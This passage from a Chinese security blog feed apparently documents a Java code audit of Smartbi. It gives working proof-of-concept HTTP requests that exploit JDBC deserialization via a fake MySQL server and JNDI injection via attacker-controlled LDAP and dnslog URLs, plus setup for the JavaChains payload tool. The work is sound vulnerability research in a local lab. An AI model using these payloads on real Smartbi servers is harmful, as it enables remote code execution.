方法：根据数据库类型、服务器地址、数据库名,生成数据库连接配置，如：&quot;jdbc:db2://&quot; + serverName + &quot;/&quot; + dbName</span><br>        String[] drvInfo = translateDriverInfo(driverType, dbServer, dbName);<br>        <span class="hljs-keyword">if</span> (drvInfo == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//创建 DefaultConnectionInfo 实例，用于表示连接信息</span><br>            <span class="hljs-type">DefaultConnectionInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultConnectionInfo</span>();<br>            info.setId(UUIDGenerator.generate());<br>            info.setName(connName);<br>            info.setDriverType(driverType);<br>            info.setDriver(drvInfo[<span class="hljs-number">0</span>]);<br>            info.setUrl(drvInfo[<span class="hljs-number">1</span>]);<br>            info.setUser(dbUser);<br>            info.setPassword(dbPass);<br>            <span class="hljs-comment">//获取数据库连接</span><br>            <span class="hljs-keyword">return</span> ConnectionPool.getInstance().getConnection(info);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String[] translateDriverInfo(DBType dbType, String serverName, String dbName, String dbEncoding) &#123;<br>        String[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">switch</span> (dbType) &#123;<br>            <span class="hljs-keyword">case</span> DB2:<br>            <span class="hljs-keyword">case</span> DB2_400:<br>                result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;COM.ibm.db2.jdbc.net.DB2Driver&quot;</span>;<br>                result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> DB2_V9:<br>                result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;com.ibm.db2.jcc.DB2Driver&quot;</span>;<br>                <span class="hljs-keyword">if</span> (serverName.indexOf(<span class="hljs-string">&quot;:&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>                    result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;:50000/&quot;</span> + dbName + <span class="hljs-string">&quot;:deferPrepares=false;&quot;</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName + <span class="hljs-string">&quot;:deferPrepares=false;&quot;</span>;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> INFORMIX:<br>                result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;com.informix.jdbc.IfxDriver&quot;</span>;<br>                result[<span class="hljs-number">1</span>] = serverName;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MYSQL:<br>            <span class="hljs-keyword">case</span> INFOBRIGHT:<br>                result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>;<br>                <span class="hljs-keyword">if</span> (dbEncoding == <span class="hljs-literal">null</span>) &#123;<br>                    dbEncoding = <span class="hljs-string">&quot;GBK&quot;</span>;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;mysqlCluster=true&quot;</span>.equals(dbType.getProp())) &#123;<br>                    result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:mysql:loadbalance://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName;<br>                    <span class="hljs-keyword">if</span> (dbName.indexOf(<span class="hljs-string">&quot;?&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>                        result[<span class="hljs-number">1</span>] = result[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;?useServerPrepStmts=true&amp;autoReconnect=true&amp;roundRobinLoadBalance=true&amp;failOverReadOnly=false&amp;characterEncoding=&quot;</span> + dbEncoding;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:mysql://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName;<br>                    <span class="hljs-keyword">if</span> (dbName.indexOf(<span class="hljs-string">&quot;?&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>                        result[<span class="hljs-number">1</span>] = result[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;?useServerPrepStmts=true&amp;useOldAliasMetadataBehavior=true&amp;useUnicode=true&amp;characterEncoding=&quot;</span> + dbEncoding;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MSSQL:<br>                ......<br></code></pre></td></tr></table></figure><p>漏洞点产生在 <code>translateDriverInfo</code> ，此处可以拼接恶意数据库</p><h3 id="漏洞复现：-1"><a href="#漏洞复现：-1" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>构造POC：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-attr">type</span><span class="hljs-operator">=</span>sqldictsync<span class="hljs-variable">&amp;</span>dbNameO<span class="hljs-attr">nly</span><span class="hljs-operator">=</span>false<span class="hljs-variable">&amp;</span>dbT<span class="hljs-attr">ype</span><span class="hljs-operator">=</span>MYSQL<span class="hljs-variable">&amp;</span>dbS<span class="hljs-attr">erver</span><span class="hljs-operator">=</span>[本机IP]:<span class="hljs-number">3308</span><span class="hljs-variable">&amp;</span>dbN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>d5a442d?detectCustomC<span class="hljs-attr">ollations</span><span class="hljs-operator">=</span>true<span class="hljs-variable">&amp;</span>autoD<span class="hljs-attr">eserialize</span><span class="hljs-operator">=</span>yes<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /smartbi/vision/SyncServlet HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost:<span class="hljs-number">18080</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">113</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5672</span>.<span class="hljs-number">127</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded;<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">138</span><br><br><span class="hljs-attribute">type</span>=sqldictsync&amp;dbNameOnly=false&amp;dbType=MYSQL&amp;dbServer=[本机IP]:<span class="hljs-number">3308</span>&amp;dbName=d5a442d?detectCustomCollations=true%<span class="hljs-number">26</span>autoDeserialize=yes<br></code></pre></td></tr></table></figure><p>同样的，开启3308端口，搭建FakeMysql服务器，生成K1链</p><p>成功利用：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071702529.png" alt="20250806181941863"></p><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><h3 id="漏洞分析：-2"><a href="#漏洞分析：-2" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071702526.png" alt="20250806192734078"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-comment">//如果数据库连接url是以JDNI开头</span><br><span class="hljs-keyword">if</span> (info.getUrl().startsWith(<span class="hljs-string">&quot;JNDI:&quot;</span>)) &#123;<br>    <span class="hljs-type">InitialContext</span> <span class="hljs-variable">cxt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>    <span class="hljs-comment">//去掉 JNDI 部分，保留后边部分，然后用 cxt.lookup 查找并返回 DataSource</span><br>    <span class="hljs-type">DataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> (DataSource)cxt.lookup(info.getUrl().substring(<span class="hljs-string">&quot;JNDI:&quot;</span>.length()));<br>    <span class="hljs-keyword">return</span> dataSource.getConnection();<br></code></pre></td></tr></table></figure><h3 id="漏洞复现：-2"><a href="#漏洞复现：-2" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>POC：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /smartbi/vision/RMIServlet HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost:<span class="hljs-number">18080</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">113</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5672</span>.<span class="hljs-number">127</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded;charset=UTF-<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>: */*<br><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">127.0.0.1:18080</span>/smartbi/vision/index.jsp<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Cookie</span>: JSESSIONID=<span class="hljs-number">5</span>E67682266D39E9F1475ADA74B62E102<br><span class="hljs-attribute">Connection</span> : keep-alive<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">466</span><br><br><span class="hljs-attribute">className</span>=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span>%<span class="hljs-number">3</span>a100,<span class="hljs-string">&quot;user&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JNDI:ldap://[ip]:15089/bb4e07&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span>%<span class="hljs-number">3</span>a-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span>%<span class="hljs-number">3</span>a0,<span class="hljs-string">&quot;dbToCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br><br><br><br><br><span class="hljs-attribute">className</span>=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span>%<span class="hljs-number">3</span>a100,<span class="hljs-string">&quot;user&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JNDI:ldap://9sjhyp.dnslog.cn&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span>%<span class="hljs-number">3</span>a-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span>%<span class="hljs-number">3</span>a0,<span class="hljs-string">&quot;dbToCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703762.png" alt="20250806192146688"></p><p>生成K1链：</p><p>ldap:&#x2F;&#x2F;[ip]:15089&#x2F;bb4e07</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703873.png" alt="20250806192251404"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703089.png" alt="20250806191933929"></p><p>这里因为端口的问题没有利用成功。报错LDAP服务器未响应</p><p>Windows 系统<strong>将 50389 端口作为排除范围</strong>，不允许程序（包括 Docker）绑定使用它。安装JavaChains 时将 <code>  -p 50389:50389 ^</code>改成了  <code>-p 15089:50389 ^</code>，可能监听不到，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703075.png" alt="20250806190250099"></p><p>使用dnslog</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /smartbi/vision/RMIServlet HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost:<span class="hljs-number">18080</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">113</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5672</span>.<span class="hljs-number">127</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded;charset=UTF-<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>: */*<br><span class="hljs-attribute">Origin</span>: http://localhost<br><span class="hljs-attribute">Referer</span>: http://localhost:<span class="hljs-number">18080</span>/smartbi/vision/index.jsp<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Cookie</span>: JSESSIONID=<span class="hljs-number">3</span>D904649DC50813C9D6EDEBC582EE4CF<br><span class="hljs-attribute">Connection</span> : keep-alive<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">457</span><br><br><span class="hljs-attribute">className</span>=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span>%<span class="hljs-number">3</span>a100,<span class="hljs-string">&quot;user&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JNDI:ldap://9sjhyp.dnslog.cn&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span>%<span class="hljs-number">3</span>a-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span>%<span class="hljs-number">3</span>a0,<span class="hljs-string">&quot;dbToCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br><br><br><span class="hljs-attribute">className</span>=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span>%<span class="hljs-number">3</span>a100,<span class="hljs-string">&quot;user&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JNDI:ldap://192.168.1.25:15089/547b87&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span>%<span class="hljs-number">3</span>a-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span>%<span class="hljs-number">3</span>a0,<span class="hljs-string">&quot;dbToCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br></code></pre></td></tr></table></figure><p>ldap:&#x2F;&#x2F;192.168.1.25:15089&#x2F;b69569</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703187.png" alt="20250806193947601"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703694.png" alt="20250806194037543"></p><p>收到DNSLOG记录，说明漏洞存在</p><h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><p>CVE-2020-1938 ：Apache Tomcat AJP 漏洞复现和分析</p><p><a href="https://www.cnblogs.com/backlion/p/12870365.html">https://www.cnblogs.com/backlion/p/12870365.html</a></p><p>Smartbi 身份认证绕过漏洞</p><p><a href="https://www.freebuf.com/vuls/373015.html">https://www.freebuf.com/vuls/373015.html</a></p><p>信息搜集相关：</p><p><a href="https://ckcah.github.io/2020/05/01/googlehack/">https://ckcah.github.io/2020/05/01/googlehack/</a></p><p><a href="https://94248.github.io/2023/07/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%9B%B8%E5%85%B3/">https://94248.github.io/2023/07/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%9B%B8%E5%85%B3/</a></p><p>servlet</p><p><a href="https://86263008.github.io/web2024/back/java/jsp/servlet/index.html">https://86263008.github.io/web2024/back/java/jsp/servlet/index.html</a></p><p><a href="https://kirklin.github.io/PrivateNotes/Java%E5%85%A8%E5%A5%97/JavaWeb/Servlet/#_11">https://kirklin.github.io/PrivateNotes/Java%E5%85%A8%E5%A5%97/JavaWeb/Servlet/#_11</a></p><p><a href="https://blog.csdn.net/yxmoar/article/details/109889006">https://blog.csdn.net/yxmoar/article/details/109889006</a></p><p>JDBC反序列化学习</p><p><a href="https://sp4zcmd.github.io/2021/09/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">https://sp4zcmd.github.io/2021/09/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</a></p><p><a href="https://xz.aliyun.com/news/7754">https://xz.aliyun.com/news/7754</a></p><p><a href="https://www.cnblogs.com/Litsasuk/articles/18410624">https://www.cnblogs.com/Litsasuk/articles/18410624</a></p><p><a href="https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html">https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html</a></p><h1 id="javachains使用"><a href="#javachains使用" class="headerlink" title="javachains使用"></a><strong>javachains使用</strong></h1><p><a href="https://java-chains.vulhub.org/zh/">https://java-chains.vulhub.org/zh/</a></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># docker 搭建</span><br><span class="hljs-attribute">docker</span> pull javachains/javachains:latest<br><br>docker run -d<span class="hljs-regexp"> ^</span><br>  --name java-chains<span class="hljs-regexp"> ^</span><br>  --restart=always<span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">8011</span>:<span class="hljs-number">8011</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">58080</span>:<span class="hljs-number">58080</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">15089</span>:<span class="hljs-number">50389</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">3308</span>:<span class="hljs-number">3308</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">13999</span>:<span class="hljs-number">13999</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">50000</span>:<span class="hljs-number">50000</span><span class="hljs-regexp"> ^</span><br>  -p <span class="hljs-number">11527</span>:<span class="hljs-number">11527</span><span class="hljs-regexp"> ^</span><br>  -e CHAINS_AUTH=<span class="hljs-literal">true</span><span class="hljs-regexp"> ^</span><br>  -e CHAINS_PASS=<span class="hljs-regexp"> ^</span><br>  javachains/javachains:latest<br><br><span class="hljs-comment">#查看当前正在运行的容器</span><br>docker ps<br><br><span class="hljs-comment">#查找日志中包含关键词 password 的行</span><br>docker logs java-chains | findstr password<br>&gt;<span class="hljs-number">08</span>-<span class="hljs-number">02</span> <span class="hljs-number">08</span>:<span class="hljs-number">06</span>:<span class="hljs-number">01</span>.<span class="hljs-number">144</span> INFO  [main] c.a.c.w.c.SecurityConfig       |  | password: HDVhxC2MfhKJwcAN<br><br><span class="hljs-comment">#停止</span><br>docker stop java-chains<br><br><span class="hljs-comment">#删除</span><br>docker rm java-chains<br><br></code></pre></td></tr></table></figure><blockquote><p>Windows 系统<strong>将 50389 端口作为排除范围</strong>，不允许程序（包括 Docker）绑定使用它。如果改端口可能有一些问题，还是尽量在Linux搭可以避免端口问题。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703682.png" alt="20250806200152925"></p></blockquote><p>访问 <code>localhost:8011</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703554.png" alt="20250806200418498"></p><p>密码：<code>docker logs java-chains | findstr password</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071704470.png" alt="20250806200413737"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Smartbi v8.5 环境搭建</title>
    <link href="/2025/08/07/Smartbi%20v8.5%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2025/08/07/Smartbi%20v8.5%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
